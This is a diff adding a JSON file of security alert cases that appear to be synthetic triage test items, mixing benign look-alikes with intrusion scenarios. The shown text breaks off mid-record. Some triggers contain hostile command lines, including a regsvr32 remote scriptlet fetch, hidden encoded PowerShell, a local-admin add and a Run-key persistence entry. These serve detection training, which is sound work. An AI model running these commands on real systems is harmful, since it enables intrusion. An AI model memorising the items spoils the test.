@@ -1,0 +1,1758 @@
+[
+  {
+    "case_id": "VIRGIL-041",
+    "alert": {
+      "rule": "Multiple Authentication Failures",
+      "severity": "medium",
+      "risk_score": 46
+    },
+    "host": {
+      "name": "APP-LEGACY-01",
+      "role": "legacy_application_server",
+      "criticality": "medium"
+    },
+    "user": {
+      "name": "svc_reports",
+      "role": "Reporting Service",
+      "is_admin": false
+    },
+    "trigger": {
+      "event": "73_failed_logons_10m",
+      "source_ip": "10.10.4.21",
+      "accounts_targeted": 1
+    },
+    "enrichment": {
+      "source_internal": true,
+      "password_rotated_2h_ago": true,
+      "service_restart_pending": true,
+      "same_account_only": true,
+      "successful_logon_after_update": true
+    }
+  },
+  {
+    "case_id": "VIRGIL-042",
+    "alert": {
+      "rule": "Password Spraying Against Multiple Accounts",
+      "severity": "high",
+      "risk_score": 86
+    },
+    "host": {
+      "name": "VPN-GW-01",
+      "role": "vpn_gateway",
+      "criticality": "high"
+    },
+    "trigger": {
+      "event": "failed_logons",
+      "source_ip": "198.51.100.42",
+      "accounts_targeted": 184,
+      "attempts_per_account": 3
+    },
+    "enrichment": {
+      "source_seen_before": false,
+      "source_country_usual": false,
+      "known_scanner": false,
+      "successful_logons": 2,
+      "mfa_failures_after_success": true
+    }
+  },
+  {
+    "case_id": "VIRGIL-043",
+    "alert": {
+      "rule": "Distributed Authentication Failures",
+      "severity": "medium",
+      "risk_score": 59
+    },
+    "host": {
+      "name": "SSO-01",
+      "role": "identity_provider",
+      "criticality": "critical"
+    },
+    "trigger": {
+      "event": "failed_logons",
+      "source_ips": 17,
+      "accounts_targeted": 29,
+      "attempts_per_account_median": 2
+    },
+    "enrichment": {
+      "source_ips_cloud_provider": true,
+      "known_scanner": false,
+      "recent_mobile_app_release": true,
+      "successful_logons": 0
+    }
+  },
+  {
+    "case_id": "VIRGIL-044",
+    "alert": {
+      "rule": "Impossible Travel Sign-In",
+      "severity": "medium",
+      "risk_score": 52
+    },
+    "host": {
+      "name": "IDENTITY",
+      "role": "identity_platform",
+      "criticality": "critical"
+    },
+    "user": {
+      "name": "rachel",
+      "role": "Consultant",
+      "is_admin": false
+    },
+    "trigger": {
+      "event": "two_successful_logins",
+      "location_a": "Virginia, US",
+      "location_b": "California, US",
+      "minutes_apart": 8
+    },
+    "enrichment": {
+      "second_ip_is_corporate_sase": true,
+      "same_managed_device": true,
+      "mfa_success": true,
+      "device_token_continuity": true
+    }
+  },
+  {
+    "case_id": "VIRGIL-045",
+    "alert": {
+      "rule": "Impossible Travel Sign-In",
+      "severity": "high",
+      "risk_score": 88
+    },
+    "host": {
+      "name": "IDENTITY",
+      "role": "identity_platform",
+      "criticality": "critical"
+    },
+    "user": {
+      "name": "cfo",
+      "role": "Chief Financial Officer",
+      "is_admin": false
+    },
+    "trigger": {
+      "event": "two_successful_logins",
+      "location_a": "Washington, DC, US",
+      "location_b": "Bucharest, RO",
+      "minutes_apart": 14
+    },
+    "enrichment": {
+      "new_device": true,
+      "new_asn": true,
+      "mfa_denials_before_success": 9,
+      "session_cookie_reuse_detected": true,
+      "user_reported_travel": false
+    }
+  },
+  {
+    "case_id": "VIRGIL-046",
+    "alert": {
+      "rule": "Impossible Travel Sign-In",
+      "severity": "medium",
+      "risk_score": 61
+    },
+    "host": {
+      "name": "IDENTITY",
+      "role": "identity_platform",
+      "criticality": "critical"
+    },
+    "user": {
+      "name": "devon",
+      "role": "Sales Engineer",
+      "is_admin": false
+    },
+    "trigger": {
+      "event": "two_successful_logins",
+      "location_a": "Toronto, CA",
+      "location_b": "New York, US",
+      "minutes_apart": 31
+    },
+    "enrichment": {
+      "mobile_device": true,
+      "carrier_ip_changed": true,
+      "new_device": false,
+      "mfa_success": true,
+      "travel_calendar_match": null
+    }
+  },
+  {
+    "case_id": "VIRGIL-047",
+    "alert": {
+      "rule": "User Added to Local Administrators",
+      "severity": "high",
+      "risk_score": 71
+    },
+    "host": {
+      "name": "ENG-WS-21",
+      "role": "engineering_workstation",
+      "criticality": "medium"
+    },
+    "user": {
+      "name": "pam-broker",
+      "role": "Privileged Access Management",
+      "is_admin": true
+    },
+    "trigger": {
+      "event": "local_group_membership_change",
+      "group": "Administrators",
+      "added_account": "alex"
+    },
+    "enrichment": {
+      "pam_request_approved": true,
+      "elevation_ttl_minutes": 60,
+      "ticket_match": true,
+      "manager_approval": true
+    }
+  },
+  {
+    "case_id": "VIRGIL-048",
+    "alert": {
+      "rule": "Unexpected Privilege Escalation",
+      "severity": "critical",
+      "risk_score": 93
+    },
+    "host": {
+      "name": "APP-07",
+      "role": "application_server",
+      "criticality": "high"
+    },
+    "user": {
+      "name": "websvc",
+      "role": "Web Service",
+      "is_admin": false
+    },
+    "trigger": {
+      "process": "cmd.exe",
+      "parent": "w3wp.exe",
+      "command_line": "net localgroup administrators websvc /add"
+    },
+    "enrichment": {
+      "approved_change": false,
+      "service_account_expected_admin": false,
+      "parent_child_seen_before": false,
+      "interactive_logon_after_change": true
+    }
+  },
+  {
+    "case_id": "VIRGIL-049",
+    "alert": {
+      "rule": "Elevated Token Created",
+      "severity": "medium",
+      "risk_score": 63
+    },
+    "host": {
+      "name": "DEV-WS-12",
+      "role": "developer_workstation",
+      "criticality": "medium"
+    },
+    "user": {
+      "name": "mia",
+      "role": "Developer",
+      "is_admin": false
+    },
+    "trigger": {
+      "event": "uac_elevation",
+      "process": "setup.exe",
+      "publisher": "Unknown Vendor"
+    },
+    "enrichment": {
+      "installer_downloaded_today": true,
+      "hash_seen_on_3_hosts": true,
+      "ticket_match": false,
+      "user_initiated_install": true
+    }
+  },
+  {
+    "case_id": "VIRGIL-050",
+    "alert": {
+      "rule": "Multiple MFA Pushes",
+      "severity": "medium",
+      "risk_score": 48
+    },
+    "host": {
+      "name": "IDENTITY",
+      "role": "identity_platform",
+      "criticality": "critical"
+    },
+    "user": {
+      "name": "carter",
+      "role": "Remote Employee",
+      "is_admin": false
+    },
+    "trigger": {
+      "event": "mfa_push_burst",
+      "pushes_10m": 5,
+      "denials": 0,
+      "approvals": 1
+    },
+    "enrichment": {
+      "vpn_client_reconnects": 5,
+      "same_managed_device": true,
+      "same_source_ip": true,
+      "user_helpdesk_ticket_open": true
+    }
+  },
+  {
+    "case_id": "VIRGIL-051",
+    "alert": {
+      "rule": "MFA Fatigue Followed by Approval",
+      "severity": "critical",
+      "risk_score": 96
+    },
+    "host": {
+      "name": "IDENTITY",
+      "role": "identity_platform",
+      "criticality": "critical"
+    },
+    "user": {
+      "name": "nina",
+      "role": "Finance Manager",
+      "is_admin": false
+    },
+    "trigger": {
+      "event": "mfa_push_burst",
+      "pushes_10m": 18,
+      "denials": 17,
+      "approvals": 1
+    },
+    "enrichment": {
+      "new_device": true,
+      "new_country": true,
+      "user_reported_activity": false,
+      "password_login_from_new_asn": true
+    },
+    "correlated_activity": {
+      "mailbox_rule_created": true,
+      "oauth_consent_added": true
+    }
+  },
+  {
+    "case_id": "VIRGIL-052",
+    "alert": {
+      "rule": "MFA Method Changed",
+      "severity": "high",
+      "risk_score": 72
+    },
+    "host": {
+      "name": "IDENTITY",
+      "role": "identity_platform",
+      "criticality": "critical"
+    },
+    "user": {
+      "name": "omar",
+      "role": "Engineer",
+      "is_admin": false
+    },
+    "trigger": {
+      "event": "mfa_device_enrollment",
+      "new_method": "authenticator_app"
+    },
+    "enrichment": {
+      "old_phone_removed_20m_prior": true,
+      "helpdesk_case_exists": true,
+      "case_status": "pending_review",
+      "new_device_managed": false,
+      "same_country": true
+    }
+  },
+  {
+    "case_id": "VIRGIL-053",
+    "alert": {
+      "rule": "Office Application Spawned Command Shell",
+      "severity": "medium",
+      "risk_score": 55
+    },
+    "host": {
+      "name": "FIN-WS-05",
+      "role": "finance_workstation",
+      "criticality": "medium"
+    },
+    "user": {
+      "name": "jules",
+      "role": "Financial Analyst",
+      "is_admin": false
+    },
+    "trigger": {
+      "process": "cmd.exe",
+      "parent": "EXCEL.EXE",
+      "command_line": "cmd.exe /c C:\\Corp\\RefreshMarketData.bat"
+    },
+    "enrichment": {
+      "workbook_signed": true,
+      "script_hash_known": true,
+      "execution_count_30d": 418,
+      "approved_business_workflow": true
+    }
+  },
+  {
+    "case_id": "VIRGIL-054",
+    "alert": {
+      "rule": "Office Application Spawned PowerShell",
+      "severity": "critical",
+      "risk_score": 94
+    },
+    "host": {
+      "name": "HR-WS-33",
+      "role": "hr_workstation",
+      "criticality": "medium"
+    },
+    "user": {
+      "name": "kelly",
+      "role": "HR Specialist",
+      "is_admin": false
+    },
+    "trigger": {
+      "process": "powershell.exe",
+      "parent": "WINWORD.EXE",
+      "command_line": "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgA..."
+    },
+    "network": {
+      "destination": "198.51.100.77:443",
+      "destination_internal": false,
+      "destination_seen_before": false
+    },
+    "enrichment": {
+      "document_from_external_email": true,
+      "parent_child_seen_before": false,
+      "approved_change": false
+    }
+  },
+  {
+    "case_id": "VIRGIL-055",
+    "alert": {
+      "rule": "Browser Spawned Script Interpreter",
+      "severity": "medium",
+      "risk_score": 62
+    },
+    "host": {
+      "name": "MKT-WS-14",
+      "role": "marketing_workstation",
+      "criticality": "low"
+    },
+    "user": {
+      "name": "taylor",
+      "role": "Marketing Analyst",
+      "is_admin": false
+    },
+    "trigger": {
+      "process": "wscript.exe",
+      "parent": "msedge.exe",
+      "command_line": "wscript.exe C:\\Users\\taylor\\Downloads\\report.vbs"
+    },
+    "enrichment": {
+      "script_signed": false,
+      "download_source": "partner_portal",
+      "partner_known": true,
+      "script_seen_before": false
+    }
+  },
+  {
+    "case_id": "VIRGIL-056",
+    "alert": {
+      "rule": "Certutil Suspicious Usage",
+      "severity": "medium",
+      "risk_score": 49
+    },
+    "host": {
+      "name": "PKI-ADMIN-01",
+      "role": "pki_admin_workstation",
+      "criticality": "high"
+    },
+    "user": {
+      "name": "pkiadmin",
+      "role": "PKI Administrator",
+      "is_admin": true
+    },
+    "trigger": {
+      "process": "certutil.exe",
+      "parent": "cmd.exe",
+      "command_line": "certutil.exe -verify C:\\PKI\\corp-root.cer"
+    },
+    "enrichment": {
+      "ticket_match": true,
+      "user_seen_using_certutil": true,
+      "file_is_certificate": true,
+      "network_download": false
+    }
+  },
+  {
+    "case_id": "VIRGIL-057",
+    "alert": {
+      "rule": "Regsvr32 Remote Scriptlet Execution",
+      "severity": "critical",
+      "risk_score": 93
+    },
+    "host": {
+      "name": "SALES-WS-08",
+      "role": "sales_workstation",
+      "criticality": "low"
+    },
+    "user": {
+      "name": "ian",
+      "role": "Sales Representative",
+      "is_admin": false
+    },
+    "trigger": {
+      "process": "regsvr32.exe",
+      "parent": "cmd.exe",
+      "command_line": "regsvr32.exe /s /n /u /i:https://198.51.100.25/a.sct scrobj.dll"
+    },
+    "enrichment": {
+      "destination_seen_before": false,
+      "command_seen_before": false,
+      "approved_change": false
+    }
+  },
+  {
+    "case_id": "VIRGIL-058",
+    "alert": {
+      "rule": "Mshta Execution",
+      "severity": "high",
+      "risk_score": 68
+    },
+    "host": {
+      "name": "OPS-WS-20",
+      "role": "operations_workstation",
+      "criticality": "medium"
+    },
+    "user": {
+      "name": "ava",
+      "role": "Operations Analyst",
+      "is_admin": false
+    },
+    "trigger": {
+      "process": "mshta.exe",
+      "parent": "explorer.exe",
+      "command_line": "mshta.exe https://intranet.example.local/tools/status.hta"
+    },
+    "enrichment": {
+      "destination_internal": true,
+      "application_owner": "Operations",
+      "file_hash_seen_before": false,
+      "change_ticket": null
+    }
+  },
+  {
+    "case_id": "VIRGIL-059",
+    "alert": {
+      "rule": "Encoded PowerShell Execution",
+      "severity": "medium",
+      "risk_score": 57
+    },
+    "host": {
+      "name": "CI-01",
+      "role": "ci_server",
+      "criticality": "medium"
+    },
+    "user": {
+      "name": "svc-build",
+      "role": "Build Service",
+      "is_admin": true
+    },
+    "trigger": {
+      "process": "powershell.exe",
+      "parent": "jenkins.exe",
+      "command_line": "powershell.exe -EncodedCommand JABQAHIAbwBkAHUAYwB0..."
+    },
+    "enrichment": {
+      "command_hash_seen_before": true,
+      "execution_count_30d": 2611,
+      "approved_pipeline": true,
+      "source_repository_known": true
+    }
+  },
+  {
+    "case_id": "VIRGIL-060",
+    "alert": {
+      "rule": "Obfuscated Script Execution",
+      "severity": "critical",
+      "risk_score": 95
+    },
+    "host": {
+      "name": "LEGAL-WS-11",
+      "role": "legal_workstation",
+      "criticality": "medium"
+    },
+    "user": {
+      "name": "paige",
+      "role": "Paralegal",
+      "is_admin": false
+    },
+    "trigger": {
+      "process": "powershell.exe",
+      "parent": "wscript.exe",
+      "command_line": "powershell.exe -NoP -W Hidden -EncodedCommand JAB3AGM..."
+    },
+    "enrichment": {
+      "script_from_temp_directory": true,
+      "parent_child_seen_before": false,
+      "approved_change": false,
+      "amsi_alert": true
+    }
+  },
+  {
+    "case_id": "VIRGIL-061",
+    "alert": {
+      "rule": "High Entropy JavaScript",
+      "severity": "medium",
+      "risk_score": 64
+    },
+    "host": {
+      "name": "DESIGN-WS-09",
+      "role": "design_workstation",
+      "criticality": "low"
+    },
+    "user": {
+      "name": "lee",
+      "role": "Designer",
+      "is_admin": false
+    },
+    "trigger": {
+      "process": "node.exe",
+      "parent": "Code.exe",
+      "command_line": "node.exe build.min.js"
+    },
+    "enrichment": {
+      "file_entropy_high": true,
+      "project_repository_known": true,
+      "developer_tooling_expected": true,
+      "file_new_today": true
+    }
+  },
+  {
+    "case_id": "VIRGIL-062",
+    "alert": {
+      "rule": "Scheduled Task Created",
+      "severity": "medium",
+      "risk_score": 51
+    },
+    "host": {
+      "name": "APP-18",
+      "role": "application_server",
+      "criticality": "high"
+    },
+    "user": {
+      "name": "svc-monitor",
+      "role": "Monitoring Service",
+      "is_admin": true
+    },
+    "trigger": {
+      "process": "schtasks.exe",
+      "parent": "installer.exe",
+      "command_line": "schtasks /create /tn CorpHealthAgent /tr C:\\Corp\\health.exe /sc minute /mo 15"
+    },
+    "enrichment": {
+      "binary_signed": true,
+      "vendor_known": true,
+      "approved_change": true,
+      "task_name_seen_before": true
+    }
+  },
+  {
+    "case_id": "VIRGIL-063",
+    "alert": {
+      "rule": "Registry Run Key Persistence",
+      "severity": "high",
+      "risk_score": 85
+    },
+    "host": {
+      "name": "EXEC-WS-02",
+      "role": "executive_workstation",
+      "criticality": "high"
+    },
+    "user": {
+      "name": "exec.user",
+      "role": "Executive",
+      "is_admin": false
+    },
+    "trigger": {
+      "process": "reg.exe",
+      "parent": "powershell.exe",
+      "command_line": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v UpdateService /d C:\\Users\\Public\\update.exe"
+    },
+    "enrichment": {
+      "binary_signed": false,
+      "binary_seen_before": false,
+      "approved_software_install": false
+    }
+  },
+  {
+    "case_id": "VIRGIL-064",
+    "alert": {
+      "rule": "New Windows Service",
+      "severity": "medium",
+      "risk_score": 66
+    },
+    "host": {
+      "name": "DEV-WS-44",
+      "role": "developer_workstation",
+      "criticality": "medium"
+    },
+    "user": {
+      "name": "riley",
+      "role": "Developer",
+      "is_admin": true
+    },
+    "trigger": {
+      "process": "sc.exe",
+      "parent": "setup.exe",
+      "command_line": "sc.exe create DevSync binPath= C:\\Program Files\\DevSync\\sync.exe"
+    },
+    "enrichment": {
+      "publisher_signed": true,
+      "publisher_seen_before": false,
+      "ticket_match": false,
+      "user_initiated_install": true
+    }
+  },
+  {
+    "case_id": "VIRGIL-065",
+    "alert": {
+      "rule": "Large Outbound Data Transfer",
+      "severity": "high",
+      "risk_score": 73
+    },
+    "host": {
+      "name": "FIN-FS-02",
+      "role": "finance_file_server",
+      "criticality": "critical"
+    },
+    "user": {
+      "name": "backupsvc",
+      "role": "Backup Service",
+      "is_admin": true
+    },
+    "trigger": {
+      "event": "large_outbound_transfer",
+      "bytes": 42949672960,
+      "destination": "10.40.0.12"
+    },
+    "enrichment": {
+      "destination_role": "backup_repository",
+      "scheduled_backup_window": true,
+      "transfer_seen_daily": true,
+      "service_account_expected": true
+    }
+  },
+  {
+    "case_id": "VIRGIL-066",
+    "alert": {
+      "rule": "Possible Data Exfiltration to Cloud Storage",
+      "severity": "critical",
+      "risk_score": 96
+    },
+    "host": {
+      "name": "RND-WS-15",
+      "role": "research_workstation",
+      "criticality": "high"
+    },
+    "user": {
+      "name": "contractor7",
+      "role": "Contractor",
+      "is_admin": false
+    },
+    "trigger": {
+      "event": "large_https_upload",
+      "bytes": 18253611008,
+      "destination": "personal-storage.example"
+    },
+    "enrichment": {
+      "destination_unsanctioned": true,
+      "transfer_volume_user_baseline_mb": 112,
+      "approved_transfer": false,
+      "employment_end_date_days": 2
+    },
+    "correlated_activity": {
+      "source_code_archive_created": true,
+      "sensitive_files_accessed": true
+    }
+  },
+  {
+    "case_id": "VIRGIL-067",
+    "alert": {
+      "rule": "Unusual Outbound Upload",
+      "severity": "high",
+      "risk_score": 70
+    },
+    "host": {
+      "name": "LEGAL-WS-09",
+      "role": "legal_workstation",
+      "criticality": "high"
+    },
+    "user": {
+      "name": "case.manager",
+      "role": "Legal Case Manager",
+      "is_admin": false
+    },
+    "trigger": {
+      "event": "https_upload",
+      "bytes": 6442450944,
+      "destination": "new-vendor-portal.example"
+    },
+    "enrichment": {
+      "destination_first_seen_days": 5,
+      "vendor_contract_exists": true,
+      "approved_transfer_ticket": false,
+      "files_classification": "confidential"
+    }
+  },
+  {
+    "case_id": "VIRGIL-068",
+    "alert": {
+      "rule": "Periodic Network Beaconing",
+      "severity": "medium",
+      "risk_score": 50
+    },
+    "host": {
+      "name": "CONF-ROOM-07",
+      "role": "conference_room_system",
+      "criticality": "low"
+    },
+    "user": {
+      "name": "SYSTEM",
+      "role": "System",
+      "is_admin": true
+    },
+    "trigger": {
+      "process": "RoomAgent.exe",
+      "destination": "52.112.10.20:443",
+      "connection_interval_seconds": 60
+    },
+    "enrichment": {
+      "binary_signed": true,
+      "vendor_known": true,
+      "destination_known_service": true,
+      "behavior_seen_30d": true
+    }
+  },
+  {
+    "case_id": "VIRGIL-069",
+    "alert": {
+      "rule": "Possible C2 Beaconing",
+      "severity": "critical",
+      "risk_score": 92
+    },
+    "host": {
+      "name": "OPS-WS-31",
+      "role": "operations_workstation",
+      "criticality": "medium"
+    },
+    "user": {
+      "name": "noah",
+      "role": "Operations User",
+      "is_admin": false
+    },
+    "trigger": {
+      "process": "updater.exe",
+      "parent": "powershell.exe",
+      "destination": "203.0.113.200:443",
+      "connection_interval_seconds": 58
+    },
+    "enrichment": {
+      "binary_signed": false,
+      "binary_seen_before": false,
+      "destination_seen_before": false,
+      "low_jitter": true,
+      "sleep_pattern_hours": 11
+    }
+  },
+  {
+    "case_id": "VIRGIL-070",
+    "alert": {
+      "rule": "Low Jitter Periodic HTTPS",
+      "severity": "medium",
+      "risk_score": 65
+    },
+    "host": {
+      "name": "ENG-WS-32",
+      "role": "engineering_workstation",
+      "criticality": "medium"
+    },
+    "user": {
+      "name": "liam",
+      "role": "Engineer",
+      "is_admin": false
+    },
+    "trigger": {
+      "process": "RemoteAssist.exe",
+      "destination": "198.51.100.140:443",
+      "connection_interval_seconds": 90
+    },
+    "enrichment": {
+      "binary_signed": true,
+      "publisher_new_to_environment": true,
+      "destination_new": true,
+      "software_inventory_match": false
+    }
+  },
+  {
+    "case_id": "VIRGIL-071",
+    "alert": {
+      "rule": "Internal Port Scan Detected",
+      "severity": "medium",
+      "risk_score": 54
+    },
+    "host": {
+      "name": "VULN-SCAN-01",
+      "role": "vulnerability_scanner",
+      "criticality": "medium"
+    },
+    "user": {
+      "name": "svc-vulnscan",
+      "role": "Vulnerability Management",
+      "is_admin": true
+    },
+    "trigger": {
+      "event": "tcp_scan",
+      "source": "10.20.1.50",
+      "targets": 612,
+      "ports_per_target": 25
+    },
+    "enrichment": {
+      "source_asset_tag": "authorized_scanner",
+      "scheduled_scan_window": true,
+      "change_ticket": true,
+      "scan_pattern_seen_weekly": true
+    }
+  },
+  {
+    "case_id": "VIRGIL-072",
+    "alert": {
+      "rule": "Internal Reconnaissance Scan",
+      "severity": "high",
+      "risk_score": 84
+    },
+    "host": {
+      "name": "FIN-WS-25",
+      "role": "finance_workstation",
+      "criticality": "medium"
+    },
+    "user": {
+      "name": "ella",
+      "role": "Finance Analyst",
+      "is_admin": false
+    },
+    "trigger": {
+      "process": "nmap.exe",
+      "parent": "cmd.exe",
+      "command_line": "nmap.exe -sT 10.20.0.0/16",
+      "targets": 892
+    },
+    "enrichment": {
+      "tool_seen_before": false,
+      "user_seen_scanning": false,
+      "approved_security_test": false,
+      "source_asset_is_scanner": false
+    }
+  },
+  {
+    "case_id": "VIRGIL-073",
+    "alert": {
+      "rule": "Horizontal Connection Sweep",
+      "severity": "medium",
+      "risk_score": 60
+    },
+    "host": {
+      "name": "NETOPS-WS-03",
+      "role": "network_admin_workstation",
+      "criticality": "high"
+    },
+    "user": {
+      "name": "neteng2",
+      "role": "Network Engineer",
+      "is_admin": true
+    },
+    "trigger": {
+      "process": "powershell.exe",
+      "event": "connection_sweep",
+      "targets": 83,
+      "destination_port": 443
+    },
+    "enrichment": {
+      "user_role_matches_activity": true,
+      "ticket_match": false,
+      "command_seen_before": false,
+      "business_hours": true
+    }
+  },
+  {
+    "case_id": "VIRGIL-074",
+    "alert": {
+      "rule": "High Volume API Calls",
+      "severity": "medium",
+      "risk_score": 49
+    },
+    "cloud": {
+      "provider": "GitHub Enterprise",
+      "resource": "api"
+    },
+    "user": {
+      "name": "svc-ci",
+      "role": "CI Automation",
+      "is_admin": false
+    },
+    "trigger": {
+      "event": "api_request_spike",
+      "requests_5m": 8420,
+      "operations": [
+        "GET /repos",
+        "GET /commits"
+      ]
+    },
+    "enrichment": {
+      "token_owned_by_ci": true,
+      "deployment_window": true,
+      "source_ip_known": true,
+      "write_operations": 0
+    }
+  },
+  {
+    "case_id": "VIRGIL-075",
+    "alert": {
+      "rule": "Unusual Administrative API Activity",
+      "severity": "critical",
+      "risk_score": 94
+    },
+    "cloud": {
+      "provider": "AWS",
+      "resource": "iam"
+    },
+    "user": {
+      "name": "access-key-AKIA...",
+      "role": "Developer API Key",
+      "is_admin": false
+    },
+    "trigger": {
+      "event": "api_sequence",
+      "operations": [
+        "ListUsers",
+        "ListRoles",
+        "CreateAccessKey",
+        "AttachUserPolicy"
+      ],
+      "requests_5m": 418
+    },
+    "enrichment": {
+      "source_ip_new": true,
+      "source_country_new": true,
+      "user_agent_new": true,
+      "maintenance_window": false
+    },
+    "correlated_activity": {
+      "cloudtrail_logging_disabled_attempt": true,
+      "secretsmanager_enumeration": true
+    }
+  },
+  {
+    "case_id": "VIRGIL-076",
+    "alert": {
+      "rule": "Unusual SaaS API Burst",
+      "severity": "medium",
+      "risk_score": 64
+    },
+    "cloud": {
+      "provider": "Microsoft Graph",
+      "resource": "directory"
+    },
+    "user": {
+      "name": "vendor-sync-app",
+      "role": "Third-Party Integration",
+      "is_admin": false
+    },
+    "trigger": {
+      "event": "api_request_spike",
+      "requests_10m": 2941,
+      "operations": [
+        "Users.Read.All",
+        "Group.Read.All"
+      ]
+    },
+    "enrichment": {
+      "oauth_app_approved": true,
+      "request_rate_new": true,
+      "vendor_maintenance_notice": true,
+      "source_ips_changed": true
+    }
+  },
+  {
+    "case_id": "VIRGIL-077",
+    "alert": {
+      "rule": "Public Storage Resource",
+      "severity": "high",
+      "risk_score": 72
+    },
+    "cloud": {
+      "provider": "AWS",
+      "resource": "s3://public-docs",
+      "account": "marketing-prod"
+    },
+    "trigger": {
+      "event": "bucket_public_access",
+      "acl": "public-read"
+    },
+    "enrichment": {
+      "data_classification": "public",
+      "security_exception_approved": true,
+      "website_hosting_enabled": true,
+      "sensitive_objects_detected": false
+    }
+  },
+  {
+    "case_id": "VIRGIL-078",
+    "alert": {
+      "rule": "Cloud Storage Made Public",
+      "severity": "critical",
+      "risk_score": 97
+    },
+    "cloud": {
+      "provider": "AWS",
+      "resource": "s3://finance-exports",
+      "account": "finance-prod"
+    },
+    "user": {
+      "name": "temp-user",
+      "role": "Contractor",
+      "is_admin": false
+    },
+    "trigger": {
+      "event": "bucket_policy_change",
+      "principal": "*",
+      "permission": "s3:GetObject"
+    },
+    "enrichment": {
+      "data_classification": "restricted",
+      "security_exception_approved": false,
+      "actor_seen_before": false,
+      "change_ticket": false
+    },
+    "correlated_activity": {
+      "external_downloads_started": true,
+      "access_logging_disabled": true
+    }
+  },
+  {
+    "case_id": "VIRGIL-079",
+    "alert": {
+      "rule": "Security Group Open to Internet",
+      "severity": "high",
+      "risk_score": 69
+    },
+    "cloud": {
+      "provider": "AWS",
+      "resource": "sg-test-web",
+      "account": "dev-sandbox"
+    },
+    "trigger": {
+      "event": "security_group_change",
+      "port": 443,
+      "source": "0.0.0.0/0"
+    },
+    "enrichment": {
+      "environment": "development",
+      "resource_has_public_dns": true,
+      "change_ticket": false,
+      "waf_attached": true,
+      "sensitive_backend_connected": false
+    }
+  },
+  {
+    "case_id": "VIRGIL-080",
+    "alert": {
+      "rule": "Unmanaged Cloud Resource Created",
+      "severity": "medium",
+      "risk_score": 53
+    },
+    "cloud": {
+      "provider": "Azure",
+      "resource": "rg-innovation-sandbox",
+      "subscription": "innovation"
+    },
+    "user": {
+      "name": "innovation.lead",
+      "role": "Innovation Program Lead",
+      "is_admin": false
+    },
+    "trigger": {
+      "event": "new_resource_group_and_vm",
+      "vm_count": 2
+    },
+    "enrichment": {
+      "executive_exception_approved": true,
+      "temporary_sandbox": true,
+      "expiration_date_set": true,
+      "corporate_billing": true
+    }
+  },
+  {
+    "case_id": "VIRGIL-081",
+    "alert": {
+      "rule": "Unauthorized Cloud Resource Provisioning",
+      "severity": "high",
+      "risk_score": 87
+    },
+    "cloud": {
+      "provider": "AWS",
+      "resource": "ec2-instance",
+      "account": "personal-linked"
+    },
+    "user": {
+      "name": "contractor3",
+      "role": "Contractor",
+      "is_admin": false
+    },
+    "trigger": {
+      "event": "new_vm_and_storage",
+      "instance_type": "gpu.large",
+      "storage_gb": 500
+    },
+    "enrichment": {
+      "corporate_data_uploaded": true,
+      "approved_project": false,
+      "corporate_billing": false,
+      "security_agent_installed": false
+    }
+  },
+  {
+    "case_id": "VIRGIL-082",
+    "alert": {
+      "rule": "Unsanctioned SaaS Application Detected",
+      "severity": "medium",
+      "risk_score": 61
+    },
+    "cloud": {
+      "provider": "SaaS",
+      "resource": "project-management-app"
+    },
+    "user": {
+      "name": "product.team",
+      "role": "Product Team",
+      "is_admin": false
+    },
+    "trigger": {
+      "event": "oauth_app_authorized",
+      "permissions": [
+        "profile",
+        "files.read"
+      ]
+    },
+    "enrichment": {
+      "vendor_security_review": "in_progress",
+      "manager_approval": true,
+      "security_approval": false,
+      "sensitive_files_accessed": false
+    }
+  },
+  {
+    "case_id": "VIRGIL-083",
+    "alert": {
+      "rule": "Mass Email with Spoof-Like Display Name",
+      "severity": "high",
+      "risk_score": 71
+    },
+    "email": {
+      "sender": "security-training@example-training.com",
+      "display_name": "IT Help Desk",
+      "recipients": 1280,
+      "subject": "Password expires today"
+    },
+    "trigger": {
+      "event": "bulk_email_delivery",
+      "links": 1
+    },
+    "enrichment": {
+      "security_awareness_campaign": true,
+      "campaign_id_match": true,
+      "sender_allowlisted_for_training": true,
+      "credential_collection_simulation": true
+    }
+  },
+  {
+    "case_id": "VIRGIL-084",
+    "alert": {
+      "rule": "Executive Impersonation Campaign",
+      "severity": "critical",
+      "risk_score": 95
+    },
+    "email": {
+      "sender": "ceo-office@examp1e-corp.com",
+      "display_name": "Chief Executive Officer",
+      "recipients": 742,
+      "subject": "Urgent payroll update"
+    },
+    "trigger": {
+      "event": "bulk_email_delivery",
+      "links": 1
+    },
+    "enrichment": {
+      "sender_domain_age_days": 2,
+      "lookalike_domain": true,
+      "dmarc_fail": true,
+      "sender_seen_before": false
+    },
+    "correlated_activity": {
+      "credential_page_detected": true,
+      "multiple_user_clicks": true
+    }
+  },
+  {
+    "case_id": "VIRGIL-085",
+    "alert": {
+      "rule": "High Volume External Email",
+      "severity": "medium",
+      "risk_score": 58
+    },
+    "email": {
+      "sender": "events@new-partner.example",
+      "display_name": "Corporate Events Team",
+      "recipients": 386,
+      "subject": "Register for the annual summit"
+    },
+    "trigger": {
+      "event": "bulk_email_delivery",
+      "links": 2
+    },
+    "enrichment": {
+      "partner_contract_exists": true,
+      "sender_domain_first_seen_days": 14,
+      "dmarc_pass": true,
+      "campaign_preannounced": false
+    }
+  },
+  {
+    "case_id": "VIRGIL-086",
+    "alert": {
+      "rule": "Macro-Enabled Attachment",
+      "severity": "high",
+      "risk_score": 68
+    },
+    "email": {
+      "sender": "finance-ops@corp.example",
+      "display_name": "Finance Operations",
+      "recipients": 14,
+      "subject": "Monthly close workbook",
+      "attachment": "CloseTemplate.xlsm"
+    },
+    "trigger": {
+      "event": "macro_enabled_attachment_opened"
+    },
+    "enrichment": {
+      "sender_internal": true,
+      "workbook_signed": true,
+      "hash_seen_monthly": true,
+      "macro_publisher_trusted": true
+    }
+  },
+  {
+    "case_id": "VIRGIL-087",
+    "alert": {
+      "rule": "Suspicious Attachment Spawned Script",
+      "severity": "critical",
+      "risk_score": 97
+    },
+    "email": {
+      "sender": "billing@unknown-vendor.example",
+      "display_name": "Accounts Payable",
+      "recipients": 23,
+      "subject": "Overdue invoice",
+      "attachment": "invoice.docm"
+    },
+    "host": {
+      "name": "AP-WS-04",
+      "role": "accounts_payable_workstation",
+      "criticality": "medium"
+    },
+    "trigger": {
+      "process": "powershell.exe",
+      "parent": "WINWORD.EXE",
+      "command_line": "powershell.exe -WindowStyle Hidden -EncodedCommand SQBFAFgA..."
+    },
+    "enrichment": {
+      "sender_seen_before": false,
+      "attachment_hash_seen_before": false,
